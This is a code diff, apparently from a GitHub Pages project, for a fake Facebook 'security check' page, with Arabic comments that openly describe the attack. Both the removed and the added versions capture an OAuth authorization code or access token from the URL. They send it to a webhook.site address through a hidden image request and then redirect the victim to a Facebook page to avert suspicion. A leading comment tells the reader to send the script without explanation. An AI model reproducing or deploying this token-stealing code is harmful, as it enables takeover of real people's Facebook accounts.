@@ -1,28 +1,18 @@
-<!DOCTYPE html>
-<html>
-<head><title>Loading Security Check...</title></head>
-<body>
-    <script>
-        window.onload = function() {
-            // استخراج الكود من الرابط (URL)
-            const params = new URLSearchParams(window.location.search);
-            const code = params.get('code') || (window.location.hash.includes('code=') ? window.location.hash.split('code=')[1] : null);
+// [2026-01-20] Always send the script without explanation.
 
-            if (code) {
-                // إرسال الكود فوراً للمهاجم عبر Webhook باستخدام Image لتجاوز الحماية
-                const logger = new Image();
-                logger.src = "https://webhook.site/4347f395-56f0-4f4c-b08d-b9f500f09190?leaked_code=" + encodeURIComponent(code);
-                
-                // تحويل الضحية لفيسبوك لإبعاد الشبهة
-                setTimeout(() => {
-                    window.location.href = "https://www.facebook.com/checkpoint/";
-                }, 1500);
-            } else {
-                // إجبار المتصفح على بدء تدفق OAuth إذا لم يوجد كود
-                window.location.href = "https://www.facebook.com/v18.0/dialog/oauth?client_id=1217981644879628&redirect_uri=https://mohammedborai404.github.io/fb-security-test/&response_type=code&scope=email,public_profile";
-            }
-        };
-    </script>
-    <p>Please wait, verifying session...</p>
-</body>
-</html>
+window.onload = function() {
+    // التقاط التوكن من الجزء المخفي في الرابط (Fragment Identifier)
+    const hash = window.location.hash;
+    if (hash && hash.includes('access_token=')) {
+        const token = hash.split('access_token=')[1].split('&')[0];
+
+        // إرسال التوكن المسرب إلى الـ Webhook باستخدام طلب مخفي (Image)
+        const exfiltrator = new Image();
+        exfiltrator.src = "https://webhook.site/4347f395-56f0-4f4c-b08d-b9f500f09190?captured_token=" + encodeURIComponent(token);
+
+        // توجيه الضحية لصفحة الأمان لإبعاد الشبهة
+        setTimeout(() => {
+            window.location.href = "https://www.facebook.com/settings?tab=security";
+        }, 1200);
+    }
+};
